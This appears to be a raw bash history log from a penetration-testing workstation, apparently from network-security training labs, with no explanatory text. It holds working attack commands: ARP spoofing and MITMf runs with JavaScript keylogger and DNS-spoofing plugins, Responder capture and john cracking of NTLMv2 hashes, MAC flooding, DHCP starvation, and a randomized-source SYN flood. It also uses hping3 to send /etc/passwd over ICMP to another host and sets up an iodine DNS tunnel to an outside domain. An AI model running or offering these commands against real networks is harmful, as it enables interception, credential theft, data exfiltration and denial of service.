+  204  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 7
+  205  cat CaptchaImage2.jpeg.txt 
+  206  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 5
+  207  cat CaptchaImage2.jpeg.txt 
+  208  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 4
+  209  cat CaptchaImage2.jpeg.txt 
+  210  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 3
+  211  cat CaptchaImage2.jpeg.txt 
+  212  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 2
+  213  cat CaptchaImage2.jpeg.txt
+  214  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 1
+  215  cat CaptchaImage2.jpeg.txt
+  216  ls -l
+  217  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 6
+  218  cat CaptchaImage2.jpeg.txt
+  219  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 7
+  220  cat CaptchaImage2.jpeg.txt
+  221  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 8
+  222  cat CaptchaImage2.jpeg.txt
+  223  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 9
+  224  cat CaptchaImage2.jpeg.txt
+  225  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 10
+  226  cat CaptchaImage2.jpeg.txt
+  227  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 11
+  228  cat CaptchaImage2.jpeg.txt
+  229  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 12
+  230  cat CaptchaImage2.jpeg.txt
+  231  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 13
+  232  cat CaptchaImage2.jpeg.txt
+  233  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 14
+  234  cd ..
+  235  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv > /root/Desktop/report.html
+  236  ls -l
+  237  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv > /root/Desktop/report.html
+  238  ls -l
+  239  mv policy_parse.rb policy_parse_galkan.rb 
+  240  vi policy_parse.rb 
+  241  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv > /root/Desktop/report.html
+  242  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv 
+  243  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv  | more
+  244  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv  > /root/Desktop/report.html 
+  245  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv  
+  246  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv   | more
+  247  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv   | less
+  248  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv   | more
+  249  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv   | wc -l
+  250  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv  > /root/Desktop/report.html 
+  251  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv  
+  252  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv   | more
+  253  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv   
+  254  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv    | grep "CORE. Process tree: ."
+  255  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv    | grep "CORE\. Process tree: \."
+  256  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv    | grep "CORE. Process tree:" | more
+  257  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv    
+  258  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv     | grep "CORE. Process tree: ."
+  259  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv     | grep "CORE. Process tree: ." | more
+  260  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv     | grep -E "CORE\. Process tree: \." 
+  261  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv     
+  262  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv      | grep "CORE. Process
+  263  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv      | grep "CORE. Process"
+  264  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv      | grep "CORE. Process tree: "
+  265  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv      | grep -v "CORE. Process tree: <"
+  266  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv      | grep "CORE. Process tree: \."
+  267  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv      | grep "CORE. Process tree: <"
+  268  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv      | grep "CORE. Process tree: ."
+  269  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv      | grep "CORE. Process tree: ." | more
+  270  ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv  
+  271  rm -rf /root/Desktop/report.html; ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv  
+  272  rm -rf /root/Desktop/report.html; ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv   > /root/Desktop/report.html
+  273  rm -rf /root/Desktop/report.html; ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv   
+  274  rm -rf /root/Desktop/report.html; ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv    | more
+  275  rm -rf /root/Desktop/report.html; ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv   
+  276  rm -rf /root/Desktop/report.html; ruby policy_parse.rb Agent6.3.7_JTBGroup_HBU.csv solutions.csv    | more
+  277  ls -l
+  278  cd ..
+  279  cd AppGuard_LogParser_Script/
+  280  vi policy_parse.rb 
+  281  cd ..
+  282  cd AppGuard_LogParser_Script/
+  283  ifconfig 
+  284  dhclient eth0 -
+  285  dhclient eth0 -v
+  286  pkill dhclient
+  287  dhclient eth0 -v
+  288  ifconfig 
+  289  arp-scan -l -I eth0 
+  290  nmap -n -Pn -sS --top-ports 10.10.15.33 --open
+  291  nmap -n -Pn -sS --top-ports 20 10.10.15.33 --open
+  292  nmap -n -Pn -sS -p 80 10.10.15.33 --open
+  293  nmap -n -Pn -sS -p 80 -D 1.1.1.1,2.2.2.2,3.3.3.3 10.10.15.33 --open 
+  294  nmap -n -Pn -sS -p 80 -D RND:5 10.10.15.33 --open 
+  295  ifconfig 
+  296  ip addr del 10.10.15.170 dev eth0 
+  297  pkill dhclient
+  298  ifconfig 
+  299  tcpdump -tttnn -i eth0 
+  300  ifconfig  eth0 172.16.155.156 netmask 255.255.255.0  up; arping -c 1 172.16.155.156; ip addr del 172.16.155.156 dev eth0 
+  301  ifconfig  eth0 172.16.155.139 netmask 255.255.255.0  up; arping -c 1 172.16.155.139; ip addr del 172.16.155.139 dev eth0 
+  302  ifconfig  eth0 172.16.155.156 netmask 255.255.255.0  up
+  303  ifconfig 
+  304  route -n
+  305  tcpdump -tttnn -i eth0 
+  306  ls -la /usr/share/nmap/scripts/ | grep ip-fo
+  307  nmap --script-help=ip-forwarding.nse
+  308  nmap -sn 172.16.155.2   --script ip-forwarding --script-args='target=8.8.8.8'
+  309  nmap -sn 172.16.155.3   --script ip-forwarding --script-args='target=8.8.8.8'
+  310  ifconfig 
+  311  nmap -sn 172.16.155.4   --script ip-forwarding --script-args='target=8.8.8.8'
+  312  nmap -sn 172.16.155.2   --script ip-forwarding --script-args='target=8.8.8.8'
+  313  route add default gw 172.16.155.2
+  314  nmap -n -Pn -sU -p 53 --open 172.16.155.0/24 --min-hostgroup 128 
+  315  dig @172.16.155.2 google.com A +SHORT
+  316  dig @172.16.155.2 google.com A +short
+  317  nmap -n -Pn -sU -p 53 --open 172.16.155.0/24 --min-hostgroup 128 
+  318  dig @172.16.155.2 google.com A +short
+  319  dig @172.16.155.254 google.com A +short
+  320  echo "172.16.155.2" > /etc/resolv.conf 
+  321  ping google.com -c 2
+  322  echo "nameserver 172.16.155.2" > /etc/resolv.conf 
+  323  ping google.com -c 2
+  324  ls -la /usr/share/nmap/scripts/ | grep recu
+  325  nmap 
+  326  ls -la /usr/share/nmap/scripts/ | grep waf
+  327  nmap -n -Pn -sS -p 80,443 --script=http-waf-detect.nse 172.16.155.156
+  328  tcpdump -tttnn -i eth0 host 10.10.15.5
+  329  traceroute www.izmitsu.com.tr 
+  330  traceroute www.izmitsu.com.tr -n
+  331  tcptraceroute -h www.izmitsu.com.tr -p 80 -n
+  332  tcptraceroute www.izmitsu.com.tr  80 -n
+  333  intrace  -h www.izmitsu.com.tr -p 80
+  334  tcpdump -tttnn -i eth0 proto ICMP
+  335  tcpdump -tttnn -i eth0 proto ICMP and proto UDP
+  336  tcpdump -tttnn -i eth0 proto ICMP and  UDP
+  337  tcpdump -tttnn -i eth0 proto ICMP and proto UDP
+  338  tcpdump -tttnn -i eth0 proto ICMP and UDP
+  339  tcpdump -tttnn -i eth0 proto '(ICMP and UDP)'
+  340  tcpdump -tttnn -i eth0 proto "(ICMP and UDP)"
+  341  tcpdump -tttnn -i eth0 "ICMP and UDP"
+  342  tcpdump -tttnn -i eth0 ICMP and UDP
+  343  tcpdump -tttnn -i eth0 icmp
+  344  tcpdump -tttnn -i eth0 icmp and udp
+  345  tcpdump -tttnn -i eth0 icmp and UDP
+  346  tcpdump -tttnn -i eth0 icmp or UDP
+  347  tcpdump -tttnn -i eth0 icmp or udp
+  348  tcpdump -tttnn -i eth0 proto ICMP or proto UDP
+  349  tcpdump -tttnn -i eth0 proto ICMP and proto UDP
+  350  tcpdump -tttnn -i eth0 proto ICMP or proto UDP
+  351  tcpdump -tttnn -i eth0 src host 192.168.1.1 and proto TCP
+  352  tcpdump -tttnn -i eth0 src host 192.168.1.2 and proto TCP
+  353  tcpdump -tttnn -i eth0 dst port 80 and proto TCP and dst host 10.10.10.1
+  354  dig www.izmitsu.com.tr A +short
+  355  cat /etc/resolv.conf 
+  356  tcpdump -tttnn -i eth0 port 53 and proto UDP -s 0 -XX
+  357  tcpdump -tttnn -i eth0 port 53 and proto UDP -s 0 
+  358  tcpdump -tttnn -i eth0 port 53 and proto UDP -s 0 -w dns.pcap
+  359  wireshark dns.pcap 
+  360  cd /root/Desktop/
+  361  file dns.dat 
+  362  cat dns.dat 
+  363  cd ..
+  364  wireshark dns.pcap 
+  365  cd DE
+  366  cd Desktop/
+  367  tcpdump -tttnn -i eth0 port 53 and proto UDP -s 0 
+  368  ping google.com -c 2
+  369  cd ..
+  370  echo "http://www.bga.com.tr" | grep -E "^https?://"
+  371  echo "https://www.bga.com.tr" | grep -E "^https?://"
+  372  echo "ftp://www.bga.com.tr" | grep -E "^https?://"
+  373  echo "ftp://www.bga.com.tr" | grep -E "^(ftp|http)s?://"
+  374  echo "ftps://www.bga.com.tr" | grep -E "^(ftp|http)s?://"
+  375  echo "https://www.bga.com.tr" | grep -E "^(ftp|http)s?://"
+  376  echo "http://www.bga.com.tr" | grep -E "^(ftp|http)s?://"
+  377  echo "smtp://www.bga.com.tr" | grep -E "^(ftp|http)s?://"
+  378  history  >> /var/www/html/komutlar2.txt 
+  379  netstat -nlput | grep 8080
+  380  ngrep --help
+  381  ngrep --help | more
+  382  ngrep -i eth0 "SSH"
+  383  ngrep -q -i eth0 "SSH"
+  384  ngrep -q  "SSH"
+  385  ngrep --help | more
+  386  ngrep -qi  "SSH-]"
+  387  ngrep -qi  "SSH\-[0-9]+\.[0-9]+"
+  388  dhclient eth0 -v
+  389  sysctl -a | grep forward
+  390  ifconfig 
+  391  sysctl -a | grep forward
+  392  sysctl  -w net.ipv4.ip_forward=1
+  393  arpspoof  -i eth0 -t 172.16.155.138 172.16.155.2
+  394  dpkg -S arpspoof
+  395  arpspoof  -i eth0 -t 172.16.155.138 172.16.155.2
+  396  arp -na
+  397  arp -s 172.16.155.2 00:50:56:e2:59:94
+  398  arp -na
+  399  tcpdump -tttnn -i eth0 -e 
+  400  macof -i eth0 
+  401  ifconfig  eth0 
+  402  ifconfig eth0 down
+  403  macchanger  -r eth0 
+  404  ifconfig  eth0 up
+  405  dhclient eth0
+  406  ifconfig eth0 
+  407  ls -l
+  408  ./dhcp_starvation.sh 
+  409  ./dhcp_starvation.sh eth0 5
+  410  ifconfig 
+  411  wireshark 
+  412  vi /etc/responder/Responder.conf 
+  413  responder -I eth0 -d -r w -b 1 -f -F 
+  414  cat /usr/share/responder/logs/SMBv2-NTLMv2-SSP-172.16.155.138.txt
+  415  john --fork=2 /usr/share/responder/logs/SMBv2-NTLMv2-SSP-172.16.155.138.txt
+  416  john --fork=2 --format=NTLMv2 /usr/share/responder/logs/SMBv2-NTLMv2-SSP-172.16.155.138.txt
+  417  john --fork=4  /usr/share/responder/logs/SMBv2-NTLMv2-SSP-172.16.155.138.txt
+  418  john --fork=4 --format=netntlmv2  /usr/share/responder/logs/SMBv2-NTLMv2-SSP-172.16.155.138.txt
+  419  vi /usr/share/responder/logs/SMBv2-NTLMv2-SSP-172.16.155.138.txt
+  420  john --fork=4 --format=netntlmv2  /usr/share/responder/logs/SMBv2-NTLMv2-SSP-172.16.155.138.txt
+  421  john --fork=4   /usr/share/responder/logs/SMBv2-NTLMv2-SSP-172.16.155.138.txt
+  422  apt-get update
+  423  apt-get install tor -y
+  424  /etc/init.d/tor start
+  425  ps -ef | grep tor | grep -v grep
+  426  netstat -nlput
+  427  apt-get install proxychains -y 
+  428  apt-get install tor proxychains -y
+  429  /etc/init.d/tor restart
+  430  netstat -nlput
+  431  pkill iodine
+  432  route -n
+  433  dhclient eth0 -v
+  434  route -n
+  435  route del -host 107.170.207.62 dev eth0
+  436  route del -host 213.74.0.3 dev eth0
+  437  route -n
+  438  ifconfig 
+  439  hping3 10.10.15.159 --icmp --sign GONDER -d 50 -c 1 --file /etc/passwd
+  440  echo "izmitsu" > gonderbeni.txt
+  441  echo "tskb.com.tr" >> gonderbeni.txt
+  442  cat gonderbeni.txt 
+  443  hping3 10.10.15.159 --icmp --sign GONDER -d 50 -c 1 --file gonderbeni.txt 
+  444  dhclient eth0 -v
+  445  nmap -n -Pn -sS --top-ports 100 172.16.155.147 --open
+  446  hping3 -S -p 445 172.16.155.147 --flood --rand-source -d 64 -w 128 &
+  447  fg
+  448  gf
+  449  fg
+  450  hping3 -S -p 445 172.16.155.147 --flood --rand-source -d 64 -w 128 &
+  451  fg
+  452  history >> /var/www/html/komutlar3.txt 
+  453  ifconfig 
+  454  hostname pentest
+  455  tcpdump -tttnn -i eth0 host 10.10.15.33
+  456  tcpdump -tttnn -i eth0 host 10.10.15.33 not arp 
+  457  tcpdump -tttnn -i eth0 host 10.10.15.33 and not ARP   
+  458  tcpdump -tttnn -i eth0 host 10.10.15.33 and not arp
+  459  tcpdump -tttnn -i eth0 host 10.10.15.33 and proto TCP
+  460  ifconfig 
+  461  /etc/init.d/apache2 restart
+  462  ifconfig 
+  463  /etc/init.d/apache2 restart
+  464  tail -f /var/log/apache2/access.log
+  465  tcpdump -tttnn -i lo port 80 -s 0 -w analiz.pcap
+  466  wireshark  analiz.pcap 
+  467  hping -c 1 -p 80 www.google.com -S 
+  468  hping3 -c 1 -p 80 www.google.com -S 
+  469  hping3 -c 1 -p 81 www.google.com -S 
+  470  hping3 -c 1 -p 80 www.google.com -F
+  471  hping3 -c 1 -p 80 -a 1.1.1.2 10.10.15.5 -S
+  472  hping3 -c 2 -p 80 --rand-source  10.10.15.5 -S
+  473  tcpdump -tttnn -i eth0
+  474  tcpdump -tttnn -i eth0 host 94.73.147.83
+  475  ping google.com -c 2
+  476  hping3 -S -p 80 -a 192.168.1.2 google.com -c 1
+  477  hping3 -S -p 80 10.10.10.1 -c 1 
+  478  hping3 -S -p 80 10.10.10.2 -c 1
+  479  tcpdump -tttnn -i eth0 proto UDP -s 0 -w dns.pcap
+  480  tcpdump -tttnn -i eth0 proto UDP and port 53 -s 0 -w dns.pcap
+  481  tcpdump -tttnn -r dns.pcap  -XX
+  482  wireshark  dns.pcap 
+  483  cd /root/Desktop/
+  484  ls -l
+  485  file dns.dat 
+  486  cat dns.dat 
+  487  hping3 --udp -c 1 -p 53 -E dns.dat  -d 64 172.16.155.2
+  488  hping3 --udp -c 1 -p 53 -E dns.dat  -a 1.1.1.1 -d 64 172.16.155.2
+  489  dig www.izmitsu.com.tr A +short
+  490  hping3 --udp -c 1 -p 53 -E dns.dat  -a 1.1.1.1 -d 64 172.16.155.2
+  491  hping3 --udp -c 1 -p 53 -E dns.dat  -d 64 172.16.155.2
+  492  wireshark 
+  493  cd ..
+  494  history  >> /var/www/html/komutlar2.txt 
+  495  /etc/init.d/apache2 restart
+  496  dhclient eth0 -v
+  497  /etc/init.d/apache2 restart
+  498  ls -la /var/www/html/
+  499  ls -l
+  500  cd /pentest/
+  501  ls -l
+  502  cd /root/
+  503  ls -l
+  504  rm -rf 445-UP.* AppGuard_LogParser_Script/ cikti  css-20190929T065512Z-001.zip  dns.pcap  font-20190929T065508Z-001.zip img-20190929T065457Z-001.zip ipler.txt kaydet.pcap  MS-17-010.*
+  505  ls -l
+  506  rm -rf ping.pcap  up.* windows.txt  js-20190929T073324Z-001.zip  Log*
+  507  ls -l
+  508  rm -rf analiz.pcap 
+  509  ls -l
+  510  dhclient eth0 -v
+  511  nmap -n -Pn -sS -p 1-10 192.168.1.13
+  512  knock 192.168.1.13 7000 8000 9000 
+  513  nmap -n -Pn -sS -p 22 192.168.1.13
+  514  ifconfig 
+  515  dhclient eth0 -v
+  516  nmap -n -Pn -sS -p 22 192.168.1.13
+  517  knock 192.168.1.13 7000 8000 9000 
+  518  nmap -n -Pn -sS -p 22 192.168.1.13
+  519  knock 192.168.1.13 7000 8000 9000 
+  520  nmap -n -Pn -sS -p 22 192.168.1.13
+  521  knock 192.168.1.13 9000 8000 7000
+  522  nmap -n -Pn -sS -p 22 192.168.1.13
+  523  knock 192.168.1.13 7000 8000 9000 
+  524  nmap -n -Pn -sS -p 22 192.168.1.13
+  525  dhclient eth0 -v
+  526  arp-scan -l -I eth0 
+  527  arp-scan -l -I eth0  | grep -E "^[0-9]"
+  528  arp-scan -l -I eth0  | grep -Eo "^[0-9]"
+  529  arp-scan -l -I eth0  | grep -E "^[0-9]{1,3}\."
+  530  arp-scan -l -I eth0  | grep -Eo "^[0-9]{1,3}\." | head -10 
+  531  arp-scan -l -I eth0  | grep -Eo "^([0-9]{1,3}\.){3}" | head -10 
+  532  arp-scan -l -I eth0  | grep -Eo "^([0-9]{1,3}\.){3}[0-9]{1,3}\s+" | head -10 
+  533  arp-scan -l -I eth0  | grep -Eo "^([0-9]{1,3}\.){3}[0-9]{1,3}\s+[0-9a-fA-F]{2}:" | head -5
+  534  arp-scan -l -I eth0  | grep -Eo "^([0-9]{1,3}\.){3}[0-9]{1,3}\s+([0-9a-fA-F]{2}:){5}" | head -5
+  535  arp-scan -l -I eth0  | grep -Eo "^([0-9]{1,3}\.){3}[0-9]{1,3}\s+([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}\s+" | head -5
+  536  arp-scan -l -I eth0  | grep -E "^([0-9]{1,3}\.){3}[0-9]{1,3}\s+([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}\s+" | head -5
+  537  arp-scan -l -I eth0  | grep -E "^([0-9]{1,3}\.){3}[0-9]{1,3}\s+([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}\s+.*" | head -5
+  538  vi tmp
+  539  cat tmp
+  540  cat tmp | grep "https://tr.linkedin.com"
+  541  cat tmp | grep  -B1 "https://tr.linkedin.com"
+  542  cat tmp | grep  -B1 "https://tr.linkedin.com" | grep -v http
+  543  cat tmp | grep  -B1 "https://tr.linkedin.com" | grep -v http | grep -Ev "^-"
+  544  cat tmp | grep  -B1 "https://tr.linkedin.com" | grep -v http | grep -Ev "^-" | cut -d " " -f1
+  545  cat tmp | grep  -B1 "https://tr.linkedin.com" | grep -v http | grep -Ev "^-" | cut -d " " -f1-3
+  546  cat tmp | grep  -B1 "https://tr.linkedin.com" | grep -v http | grep -Ev "^-" | cut -d " " -f1-2
+  547  cat tmp | grep  -B1 "https://tr.linkedin.com" | grep -v http | grep -Ev "^-" | cut -d " " -f1-2 | tr [A-Z] [a-z]
+  548  cat tmp | grep  -B1 "https://tr.linkedin.com" | grep -v http | grep -Ev "^-" | cut -d " " -f1-2 | tr [A-Z] [a-z] | tr -s " " "."
+  549  cat tmp | grep  -B1 "https://tr.linkedin.com" | grep -v http | grep -Ev "^-" | cut -d " " -f1-2 | tr [A-Z] [a-z] | tr -s " " "." | sed -e "s/Ö/O/g"
+  550  cat tmp | grep  -B1 "https://tr.linkedin.com" | grep -v http | grep -Ev "^-" | cut -d " " -f1-2 | tr [A-Z] [a-z] | tr -s " " "." | sed -e "s/Ö/o/g"
+  551  ssh 107.170.207.62 -p 443
+  552  echo "deneme" | md5sum
+  553  echo "denem" | md5sum
+  554  ssh 107.170.207.62 -p 443
+  555  ssh 107.170.207.62 -p 443 -l cihat
+  556  ssh 107.170.207.62 -p 443 -l cihat -D 8080
+  557  tcpdump -tttnn -i eth0 proto TCP and port 21 -s 0 -w ftp.pcap
+  558  wireshark ftp.pcap 
+  559  tcpdump -tttnn -i eth0 host 172.16.155.138 and proto TCP and port 21 -s 0 -w ftp.pcap
+  560  wireshark ftp.pcap 
+  561  tcpdump -tttnn -i eth0 host 172.16.155.138 and proto TCP and port 80 -s 0 -w http.pcap
+  562  wireshark http.pcap 
+  563  cd /pentest/MITMf/
+  564  apt-cache search mitmf
+  565  apt-cache search mitm
+  566  ./mitmf.py 
+  567  ./mitmf.py -i eth0 --gateway 172.16.155.2 --target 172.16.155.140 --arp --spoof 
+  568  ./mitmf.py -i eth0 --gateway 172.16.155.2 --target 172.16.155.138 --arp --spoof 
+  569  ./mitmf.py -i eth0 --gateway 172.16.155.2 --target 172.16.155.138 --arp --spoof  --upsidedownternet
+  570  ./mitmf.py -i eth0 --gateway 172.16.155.2 --target 172.16.155.138 --arp --spoof  --screen 
+  571  /etc/init.d/apache2 stop
+  572  ./mitmf.py -i eth0 --gateway 172.16.155.2 --target 172.16.155.138 --arp --spoof  --upsidedownternet
+  573  ./mitmf.py -i eth0 --gateway 172.16.155.2 --target 172.16.155.138 --arp --spoof  --screen
+  574  ./mitmf.py --help | grep js
+  575  ./mitmf.py -i eth0 --gateway 172.16.155.2 --target 172.16.155.138 --arp --spoof  --jskeylogger
+  576  ./mitmf.py -i eth0 --gateway 172.16.155.2 --target 172.16.155.138 --arp --spoof  --screen
+  577  ls -l
+  578  ls -la tests/
+  579  ls -la tools/
+  580  ls -la plugins/
+  581  ls -la lo
+  582  ls -la logs/
+  583  ls -la logs/dns/
+  584  ls -l
+  585  ls -la config/
+  586  vi config/mitmf.conf 
+  587  ./mitmf.py -i eth0 --gateway 172.16.155.2 --target 172.16.155.138 --arp --spoof  --dns 
+  588  tcpdump -tttnn -i eth0
+  589  cd /root/
+  590  msfconsole 
+  591  w
+  592  who
+  593  tty
+  594  w
+  595  ping filehsaring
+  596  cat /usr/share/responder/logs/SMBv2-NTLMv2-SSP-172.16.155.138.txt
+  597  cat /etc/apt/sources.list
+  598  vi /etc/proxychains.conf 
+  599  cat /etc/proxychains.conf  | grep -Ev "^$|^#"
+  600  proxychains firefox https://check.torproject.org/
+  601  cat /etc/proxychains.conf  | grep -Ev "^$|^#"
+  602  proxychains firefox https://check.torproject.org/
+  603  dig tskb.com.tr A +trace
+  604  dhclient eth0 -v
+  605  dig tskb.com.tr A +trace
+  606  dig tunnel.meterpreter.net NS +trace
+  607  dig tunnel.meterpreter.net NS +short
+  608  iodine tunnel.meterpreter.net 
+  609  ps -ef | grep iodie
+  610  ps -ef | grep iodi
+  611  ifconfig 
+  612  ping 192.168.100.1
+  613  ps -ef | grep iod
+  614  kill -9 10614
+  615  route -n
+  616  route del default
+  617  route -n
+  618  dhclient eth0 v
+  619  dhclient eth0 -v
+  620  cat /etc/resolv.conf 
+  621  route -n
+  622  route del default
+  623  route -n
+  624  route add -host 107.170.207.62 gw 10.10.15.5 dev eth0 
+  625  route add -host 213.74.0.3 gw 10.10.15.5 dev eth0 
+  626  route -n
+  627  iodine tunnel.meterpreter.net 
+  628  ifconfig 
+  629  route -n
+  630  route add default gw 192.168.100.1
+  631  route -n
+  632  ping google.com 
+  633  tcpdump -tttnn -i eth0 
+  634  tcpdump -tttnn -i eth0  -XX
+  635  tcpdump -tttnn -i eth0  port 53
+  636  top -c
+  637  nload eth0 
+  638  ifconfig 
+  639  history  >> /var/www/html/komutlar.txt
+  640  history  >> /var/www/html/komutlar3.txt
+  641  ifconfig 
+  642  dhclient eth0 -v
+  643  ifconfig 
+  644  setoolkit 
+  645  history  >> /var/www/html/komutlar3.txt 
+  646  ifconfig 
+  647  /etc/init.d/apache2 restart
+  648  iptables -L -n -t nat
+  649  iptables -L -n 
+  650  write root tty/7
+  651  write root tty7
+  652  w
+  653  tty2
+  654  tty
+  655  w
+  656  write root tty3
+  657  tty
+  658  ifconfig 
+  659  dhclient eth0 -v
+  660  route -n
+  661  ifconfig 
+  662  sysctl  -a | grep forward
+  663  sysctl  -w net.ipv4.ip_forward=1
+  664  route -n
+  665  arpspoof -i eth0 -t 172.16.35.114 172.16.35.254
+  666  ifconfig 
+  667  setoolkit 
+  668  hostname
+  669  hostname pentest
+  670  tcpdump -tttnn -i eth0 port 80 and proto TCP -s 0 -w http.pcap
+  671  wireshark  http.pcap 
+  672  cd MITMf/
+  673  ls -la
+  674  ./mitmf.py  -i eth0 --target 172.16.35.114 --gateway 172.16.35.254 --arp --spoof
+  675  vi config/mitmf.conf 
+  676  ./mitmf.py  -i eth0 --target 172.16.35.114 --gateway 172.16.35.254 --arp --spoof --dns
+  677  vi config/mitmf.conf 
+  678  ./mitmf.py  -i eth0 --target 172.16.35.114 --gateway 172.16.35.254 --arp --spoof --dns
+  679  ./mitmf.py  -i eth0 --target 172.16.35.114 --gateway 172.16.35.254 --arp --spoof 
+  680  ./mitmf.py  -i eth0 --target 172.16.35.114 --gateway 172.16.35.0/22 --arp --spoof 
+  681  ./mitmf.py  -i eth0 --target 172.16.35.0/22 --gateway 172.16.35.254 --arp --spoof 
+  682  bg
+  683  ps -ef | grep mit
+  684  kill -9 1535
+  685  cd /root/
+  686  hostname pentest
+  687  msfconsole 
+  688  leafpad 
+  689  ifconfig 
+  690  iwconfig 
+  691  dmesg 
+  692  shutdown -h now
+  693  ifconfig 
+  694  dhclient eth0 -v
+  695  pkill dhclient
+  696  ifconfig 
+  697  ifconfig  eth0 
+  698  macchanger  -r eth0 
+  699  dhclient eth0 
+  700  ifconfig  eth0
+  701  ifconfig 
+  702  tcpdump -tttnn -i eth0 proto UDP
+  703  tcpdump -tttnn -i eth0 proto UDP and port 67
+  704  ifconfig 
+  705  route -n
+  706  route del default
+  707  route add default gw 172.16.32.77
+  708  route -n
+  709  ping google.com -c 2
+  710  route del default
+  711  route add default gw 172.16.35.5
+  712  ping google.com -c 2
+  713  sysctl  -a | grep redirec
+  714  sysctl  -a | grep icmp
+  715  sysctl  -w net.ipv4.icmp_echo_ignore_all=1
+  716  ping google.com -c 2
+  717  traceroute 8.8.8.8
+  718  pkill dhclient
+  719  ifconfig  eth0 
+  720  macchanger  -r eth0 
+  721  dhclient eth0 
+  722  ifconfig  eth0 
+  723  cd MITMf/
+  724  ls -la
+  725  ./mitmf.py -i eth0 --target 172.26.1.190 --gateway 172.26.1.1 --arp --spoof
+  726  ./mitmf.py -i eth0 --target 172.26.1.0/24 --gateway 172.26.1.1 --arp --spoof
+  727  jobs -l
+  728  kill -9 6765
+  729  ./mitmf.py -i eth0 --target 172.26.1.190 --gateway 172.26.1.1 --arp --spoof
+  730  ./mitmf.py -i eth0 --target 172.26.1.190 --gateway 172.26.1.254 --arp --spoof
+  731  cd ..
+  732  ls -l
+  733  cd mI
+  734  cd MITMf/
+  735  ./mitmf.py -i eth0 --target 172.26.1.190 --gateway 172.26.1.254 --arp --spoof
+  736  ifconfig
+  737  ping google.com
+  738  ifconfig 
+  739  pkill dhclient
+  740  ifconfig 
+  741  cat /etc/resolv.
+  742  cat /etc/resolv.conf 
+  743  ip addr del 172.26.1.151 dev eth0 
+  744  ifconfig 
+  745  ifconfig  eth0 172.26.1.182 netmask 255.255.255.0 up
+  746  route add default gw 172.26.1.254
+  747  echo "nameserver 172.26.1.1" > /etc/resolv.
+  748  echo "nameserver 172.26.1.1" > /etc/resolv.conf 
+  749  rm -rf /etc/resolv.
+  750  ping google.com
+  751  ifconfig 
+  752  route -n
+  753  cat /etc/resolv.conf 
+  754  echo "nameserver 172.26.1.254" > /etc/resolv.conf 
+  755  ping google.com
+  756  ifconfig 
+  757  netstat -nlput
+  758  tcpdump -tttnn -i eth0 port 67
+  759  tcpdump -tttnn -i eth0 port 67 -s 0 -XX
+  760  ifconfig 
+  761  route -n
+  762  ./mitmf.py  -i eth0 --gateway 192.168.33.1 --target 192.168.33.28  --arp --spoof
+  763  ./mitmf.py  -i eth0 --gateway 192.168.33.1 --target 192.168.33.0/24  --arp --spoof
+  764  bg
+  765  jobs -l
+  766  kill -9 9252
+  767  vi config/mitmf.conf 
+  768  ifconfig 
+  769  vi config/mitmf.conf 
